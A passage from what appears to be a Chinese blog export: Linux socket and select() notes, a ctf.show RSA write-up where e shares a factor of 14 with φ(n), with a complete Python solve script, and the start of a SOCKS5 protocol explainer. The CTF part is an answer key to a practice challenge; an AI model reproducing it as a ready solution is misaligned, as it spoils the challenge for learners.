<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>h_name<span class="token punctuation">;</span>          <span class="token comment">/* name of the host */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>h_aliases<span class="token punctuation">;</span>      <span class="token comment">/* list of aliases (nickname) */</span>
    <span class="token keyword">int</span> h_addrtype<span class="token punctuation">;</span>        <span class="token comment">/* address type */</span>
    <span class="token keyword">int</span> h_length<span class="token punctuation">;</span>          <span class="token comment">/* length in bytes of the address */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>h_addr_list<span class="token punctuation">;</span>    <span class="token comment">/* list of address (network order) */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果没有指定主机或地址的数据库条目，信息函数将返回一个全指针。</p>
<hr>
<p>可通过某些服务信息功能获得有关服务和相关端口号的信息。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span>
<span class="token keyword">struct</span> <span class="token class-name">servent</span> <span class="token operator">*</span><span class="token function">getservbyname</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>proto<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">servent</span> <span class="token operator">*</span><span class="token function">getservbyport</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>proto<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>proto</code> 参数指定用于连接到服务的协议，对于 <code>SOCK_STREAM</code> <code>TCP</code> 连接为“ <code>tcp</code>”，对于 <code>SOCK_DGRAM</code>  <code>UDP</code> 数据报为“ <code>udp</code>”。</p>
<p>结构 <code>servent</code> 至少包含以下成员：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">servent</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>s_name<span class="token punctuation">;</span>          <span class="token comment">/* name of the service */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>s_aliases<span class="token punctuation">;</span>      <span class="token comment">/* list of aliases (alternative name) */</span>
    <span class="token keyword">int</span> s_port<span class="token punctuation">;</span>            <span class="token comment">/* The IP port number */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>s_proto<span class="token punctuation">;</span>         <span class="token comment">/* The service type, usually "tcp" or "udp" */</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过调用 <code>gethostbyname</code> 并打印结果，可以收集有关计算机的主机数据库信息。<br>地址列表需要转换为适当的地址类型，并使用 <code>inet_nota</code> 转换从网络顺序转换为可打印字符串。</p>
<p>inet_ntoa有以下定义：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span> in<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>将网络主机的四元地址转换为一个四元格式。出错时返回-1。<br>您使用的另一个新函数是 <code>gethostname</code> 。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">gethostname</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> <span class="token keyword">int</span> namelength<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>此函数用于将当前主机的名称写入按名称给定的字符串中。</p>
<h1 id="Multiple-Clients"><a href="#Multiple-Clients" class="headerlink" title="Multiple Clients"></a>Multiple Clients</h1><p>服务器程序使用fork处理多个客户端。 在数据库应用程序中，这可能不是最佳解决方案。</p>
<ul>
<li>因为服务器程序可能很大</li>
<li>仍然存在协调来自多个服务器副本的数据库访问的问题。</li>
</ul>
<p>实际上，您真正需要的是单台服务器处理多个客户端的方法，而不会阻塞并等待客户端请求的到达。</p>
<p>select函数对数据结构 <code>fd_set</code> 进行操作，这些数据结构是打开文件描述符的集合。 定义了许多宏来处理这些集合：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span>
<span class="token keyword">void</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span>fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">FD_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">FD_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">FD_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>FD_ZERO</code> 将 <code>fd_set</code> 初始化为空集，<code>FD_SET</code> 和 <code>FD_CLR</code> 集，并清除与作为 <code>fd</code> 传递的文件描述符相对应的集合元素。</p>
<p>如果 <code>fd</code> 引用的文件描述符是 <code>fdset</code> 指向的 <code>fd_set</code> 的元素，则 <code>FD_ISSET</code> 返回非零。<br><code>fd_set</code> 结构中文件描述符的最大数量由常量 <code>FD_SETSIZE</code> 给出。<br>选择函数还可以使用超时值来防止无限期阻塞。 超时值使用结构 <code>timeval</code> 给出。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">time_t</span>    tv_sec<span class="token punctuation">;</span>      <span class="token comment">/* seconds */</span>
    <span class="token keyword">long</span>      tv_usec<span class="token punctuation">;</span>     <span class="token comment">/* microseconds */</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>select系统调用具有以下原型：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span>
<span class="token keyword">int</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">int</span> nfds<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>readfds<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>writefds<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>errorfds<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>对select的调用用于测试一组文件描述符中的任何一个是否已准备好进行读取或写入，或者是否有待处理的错误条件，并且可以选择阻塞直到一个文件描述符准备就绪。<br><code>nfds</code> 参数指定要测试的文件描述符的数量，并考虑从0到 <code>nfds-1</code> 的描述符。</p>
<blockquote>
<p>Select 函数修改由<code>readfds</code>、<code>writefds</code>和<code>exceptfds</code>所指向的描述字集合。这3个参数既是传送值的参数，也是回收结果的参数。当我们调用select函数时，在这3个参数中指定感兴趣的描述符，而select函数返回时则存储结果于其中指明就绪的描述。为了检测描述字集合中那些是就绪的，要使用<code>FD_ISSET</code>宏调用，任何未就绪的描述字在描述字集合中对应位将清零。因此，每次调用select时，都应当重置感兴趣的描述字集合。</p>
</blockquote>
<p>选择函数将返回</p>
<ul>
<li>如果 <code>readfds</code> 集合中的任何描述符已准备好读取，</li>
<li>如果 <code>writefds</code> 集合中的任何内容准备好进行写入，</li>
<li>如果 <code>errorfds</code> 中有任何错误条件。</li>
</ul>
<p>如果以上条件均不适用，则select将在超时指定的时间间隔后返回。<br>如果timeout参数为空指针，并且套接字上没有任何活动，则调用将永远阻塞。<br>当select返回时，描述符集将被修改以指示哪些描述符已准备好读取或写入或有错误。</p>
<p>您应该使用 <code>FD_ISSET</code> 对其进行测试，以确定需要注意的描述符。<br>在发生超时的情况下，所有描述符集将为空。<br>select调用返回修改后的集合中描述符的总数。 失败时返回–1，设置 <code>errno</code> 来描述错误。</p>
<h1 id="Datagrams"><a href="#Datagrams" class="headerlink" title="Datagrams"></a>Datagrams</h1><p><code>UDP</code>提供的服务通常用于客户机需要对服务器进行简短查询并期望单个简短响应的地方。<br>因此，如果数据对您很重要，则需要对 <code>UDP</code> 客户端进行仔细编码，以检查错误并在必要时重试。<br>要访问 <code>UDP</code> 提供的服务，我们需要使用两个特定于数据报的系统调用 <code>sendto</code> 和 <code>recvfrom</code>。</p>
<p><code>sendto</code> 系统调用使用套接字地址和地址长度从套接字上的缓冲区发送数据报。 它的原型实质上是</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sendto</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span>
<span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> tolen<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>recvfrom</code> 系统调用在套接字上等待来自指定地址的数据报，并将其接收到缓冲区中。 它的原型实质上是</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span>
<span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>fromlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果发生错误，则 <code>sendto</code> 和 <code>recvfrom</code> 都将返回–1，并将适当地设置 <code>errno</code>。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>NEU</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA中e与φ(n)不互素</title>
    <url>/2020/08/17/rsa-zhong-e-yu-f-n-bu-hu-su/</url>
    <content><![CDATA[<p>在ctf.show中刷到一道题目，给出了两组e,p,q,c，但其中gcd(e,φ(n))!=1，网上查了一下</p>
<blockquote>
<p><a href="https://blog.csdn.net/chenzzhenguo/article/details/94339659">https://blog.csdn.net/chenzzhenguo/article/details/94339659</a></p>
<p><a href="https://www.anquanke.com/post/id/164575#h2-2">https://www.anquanke.com/post/id/164575#h2-2</a></p>
</blockquote>
<span id="more"></span>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">e1 <span class="token operator">=</span> <span class="token number">14606334023791426</span>
p1 <span class="token operator">=</span> <span class="token number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span>
q1 <span class="token operator">=</span> <span class="token number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span>
c1 <span class="token operator">=</span> <span class="token number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span>

e2 <span class="token operator">=</span> <span class="token number">13813369129257838</span>
p2 <span class="token operator">=</span> <span class="token number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span>
q2 <span class="token operator">=</span> <span class="token number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span>
c2 <span class="token operator">=</span> <span class="token number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>其中p1=p2，gcd(e1, φ(n1)) = gcd(e1, φ(n2)) = 14</p>
<script type="math/tex; mode=display">
gcd(e,\varphi(n))=b \\
ed\equiv 1\pmod {\varphi(n)} \\
e = a * b \\
abd\equiv 1\pmod {\varphi(n)} \\
m^{ab}\equiv c \pmod n \\
c^{bd}\equiv m^{abbd}\equiv m^b\pmod n</script><p>可以得到b=14，而此时，a与φ(n)正好互素</p>
<p>可以通过逆元求到bd <code>bd=gmpy2.invert(e, φ(n))</code></p>
<p>通过pow(c,bd,n)</p>
<p>可以得到两组值：</p>
<script type="math/tex; mode=display">
res1 \equiv m^{14}\pmod {n1} \\
res2 \equiv m^{14}\pmod {n2}</script><p>接着进一步推导</p>
<script type="math/tex; mode=display">
res1 \equiv m^{14}\pmod {p1} \\
res1 \equiv m^{14}\pmod {q1} \\
res2 \equiv m^{14}\pmod {q2}</script><p>这里就是可以使用中国剩余定理了</p>
<p>可以解出一个特解m的值</p>
<p>当模n1，n2无法解出时，考虑换成模q1*q2</p>
<script type="math/tex; mode=display">
res \equiv m^{14}\pmod {q1*q2}\\
原理如下\\
res1 = k1 * q1 + m^{14}\\
res2 = k2 * q2 + m^{14}\\
res1 * res2 = k1k2q1q2 + (k1q1 + k2q2 + m^{14})m^{14} \\
两边同时模q1*q2即为上式</script><p>此时，该题目就被化简为一个新的RSA</p>
<blockquote>
<p>密文为刚刚求出的特解m</p>
<p>公钥e=14</p>
<p>模数分解为q1，q2</p>
</blockquote>
<p>而此时就可按照之前的思路进行求解</p>
<script type="math/tex; mode=display">
c\equiv m^e\pmod {q1q2} \\
e = 2 * 7 \\
2 * 7 * d \equiv 1 \pmod {q1q2} \\
m^2\equiv c^{d*2}\pmod {q1q2}</script><p>先求得7的逆元，然后对m开方即可</p>
<h1 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2

e1 <span class="token operator">=</span> <span class="token number">14606334023791426</span>
c1 <span class="token operator">=</span> <span class="token number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span>
e2 <span class="token operator">=</span> <span class="token number">13813369129257838</span>
c2 <span class="token operator">=</span> <span class="token number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span>
p <span class="token operator">=</span> <span class="token number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span>
q1 <span class="token operator">=</span> <span class="token number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span>
q2 <span class="token operator">=</span> <span class="token number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span>
n1 <span class="token operator">=</span> p <span class="token operator">*</span> q1
n2 <span class="token operator">=</span> p <span class="token operator">*</span> q2
f1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
f2 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
tmp <span class="token operator">=</span> <span class="token number">14</span>

e1 <span class="token operator">=</span> e1 <span class="token operator">//</span> tmp
e2 <span class="token operator">=</span> e2 <span class="token operator">//</span> tmp
bd1 <span class="token operator">=</span> invmod<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> f1<span class="token punctuation">)</span>
bd2 <span class="token operator">=</span> invmod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> f2<span class="token punctuation">)</span>

m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> bd1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>
m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> bd2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
m3 <span class="token operator">=</span> m1 <span class="token operator">%</span> p
m2 <span class="token operator">=</span> m2 <span class="token operator">%</span> q2
m1 <span class="token operator">=</span> m1 <span class="token operator">%</span> q1

m <span class="token operator">=</span> solve_crt<span class="token punctuation">(</span><span class="token punctuation">[</span>m1<span class="token punctuation">,</span> m2<span class="token punctuation">,</span> m3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>q1<span class="token punctuation">,</span> q2<span class="token punctuation">,</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
n <span class="token operator">=</span> q1 <span class="token operator">*</span> q2
f <span class="token operator">=</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> m <span class="token operator">%</span> n
d2 <span class="token operator">=</span> invmod<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>RSA</tag>
        <tag>CTFshow</tag>
      </tags>
  </entry>
  <entry>
    <title>SOCKS5协议详解及Python简单实现</title>
    <url>/2021/06/13/socks5-xie-yi-xiang-jie-ji-python-jian-dan-shi-xian/</url>
    <content><![CDATA[<h1 id="SOCKS协议"><a href="#SOCKS协议" class="headerlink" title="SOCKS协议"></a>SOCKS协议</h1><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS是”SOCKet Secure”的缩写。</p>
<p>当防火墙后的客户端要访问外部的服务器时，就跟SOCKS代理服务器连接。这个代理服务器控制客户端访问外网的资格，允许的话，就将客户端的请求发往外部的服务器。</p>
<span id="more"></span>
<p>这个协议最初由David Koblas开发，而后由NEC的Ying-Da Lee将其扩展到SOCKS4。最新协议是SOCKS5，与前一版本相比，增加支持UDP、验证，以及IPv6。</p>
<p>根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。</p>
<p>SOCKS协议不提供加密。</p>
<h1 id="SOCKS5协议"><a href="#SOCKS5协议" class="headerlink" title="SOCKS5协议"></a>SOCKS5协议</h1><h2 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h2><ol>
<li>客户端连接到 SOCKS 服务端，发送的协议版本与认证方法数据包格式：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">+----+----------+----------+
|VER | NMETHODS | METHODS  |
+----+----------+----------+
| 1  |    1     | 1 to 255 |
+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>VER 是指协议版本，因为是 socks5，所以值是 0x05,一个字节</li>
<li>NMETHODS 是指有多少个可以使用的方法，也就是客户端支持的认证方法，一个字节</li>
<li>METHODS 就是方法值，1-255个字节，有多少个方法就有多少个byte</li>
</ul>
<ol>
<li>服务端要从给定的方法列表中选择一个方法并返回选择报文：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">+----+--------+
|VER | METHOD |
+----+--------+
| 1  |   1    |
+----+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>VER与METHOD的取值同上</p>
<p>目前已定义方法如下：</p>
<ul>
<li>0x00 NO AUTHENTICATION REQUIRED 不需要认证</li>
<li>0x01 GSSAPI 参考：<a href="https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface">GSSAPI</a></li>
<li>0x02 USERNAME/PASSWORD 用户名密码认证</li>
<li>0x03 to 0x7F IANA ASSIGNED 一般不用。INNA保留。</li>
<li>0x80 to 0xFE RESERVED FOR PRIVATE METHODS 保留作私有用处。</li>
<li>0xFF NO ACCEPTABLE METHODS 不接受任何方法/没有合适的方法</li>
</ul>
<h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><p>一旦认证方法对应的协商完成，客户端就可以发送请求细节了。如果认证方法为了完整性或者可信性的校验，需要对后续请求报文进行封装，则后续请求报文都要按照对应规定进行封装。</p>
<p>SOCKS 请求为如下格式：</p>
<pre class="line-numbers language-none"><code class="language-none">+----+-----+-------+------+----------+----------+
|VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
+----+-----+-------+------+----------+----------+
| 1  |  1  | X&#39;00&#39; |  1   | Variable |    2     |
+----+-----+-------+------+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>VER 还是版本，取值是 0x05</li>
<li>CMD 是指要做啥，取值如下：<ul>
<li>CONNECT 0x01 连接</li>
<li>BIND 0x02 端口监听(也就是在Server上监听一个端口)</li>
<li>UDP ASSOCIATE 0x03 使用UDP</li>
</ul>
</li>
<li>RSV 是保留位，值是 0x00</li>
<li>ATYP 是目标地址类型，有如下取值：<ul>
<li>0x01 IPv4</li>
<li>0x03 域名</li>
<li>0x04 IPv6</li>
</ul>
</li>
<li>DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址</li>
<li>DST.PORT 两个字节代表端口号</li>
</ul>
<p>SOCKS 服务端会根据请求类型和源、目标地址，执行对应操作，并且返回对应的一个或多个报文信息。</p>
<h2 id="回复"><a href="#回复" class="headerlink" title="回复"></a>回复</h2><p>客户端与服务端建立连接并完成认证之后就会发送请求信息，服务端执行对应请求并返回如下格式的报文：</p>
<pre class="line-numbers language-none"><code class="language-none">+----+-----+-------+------+----------+----------+
|VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
+----+-----+-------+------+----------+----------+
| 1  |  1  | X&#39;00&#39; |  1   | Variable |    2     |
+----+-----+-------+------+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>VER 还是版本，值是 0x05</li>
<li>REP 是状态码，取值如下：<ul>
<li>0x00 succeeded</li>
<li>0x01 general SOCKS server failure</li>
<li>0x02 connection not allowed by ruleset</li>
<li>0x03 Network unreachable</li>
<li>0x04 Host unreachable</li>
<li>0x05 Connection refused</li>
<li>0x06 TTL expired</li>
<li>0x07 Command not supported</li>
<li>0x08 Address type not supported</li>
<li>0x09 to 0xff unassigned</li>
</ul>
</li>
<li>RSV 保留位，取值为 0x00</li>
<li>ATYP 是目标地址类型，有如下取值：<ul>
<li>0x01 IPv4</li>
<li>0x03 域名</li>
<li>0x04 IPv6</li>
</ul>
</li>
<li>DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址</li>
<li>DST.PORT 两个字节代表端口号</li>
</ul>
<h2 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h2><ul>
<li>到了这个阶段基本就是数据转发了，tcp就直接转发，udp还须要做点工作。<ul>
<li>当一个响应（REP值不为<code>X00</code>）指示失败的时候，SOCKS服务器必须在发送这个响应后立刻断开这条TCP连接。这必须发生在检测到引起失败的原因之后的10秒内。</li>
<li>如果响应码（REP值为<code>X00</code>）指示成功，而且这次请求是BIND或者CONNECT，那么客户端可以立刻开始数据传输。如果选择的认证方法支持针对完整性、认证或私密性目的封装，要传输的数据应该包装在所依赖的认证方法的封装中。同样地，当针对客户端的响应数据到达SOCKS服务器的时候，服务器也必须根据使用的认证方法来封装数据。</li>
</ul>
</li>
<li>一个基于UDP的客户端必须将它的数据报发送到UDP中继服务器的指定端口——该端口在针对UDP ASSOCIATE的响应中的BND.PORT域指明。如果选择的认证方法提供了针对认证、完整性或私密性目的的封装，数据报必须使用恰当的封装方式进行包装。每一个UDP数据报都随身携带了一个UDP请求头：</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">+----+------+------+----------+----------+----------+
|RSV | FRAG | ATYP | DST.ADDR | DST.PORT |   DATA   |
+----+------+------+----------+----------+----------+
| 2  |  1   |  1   | Variable |    2     | Variable |
+----+------+------+----------+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>RSV　保留字段，应当置为 X‘0000’</li>
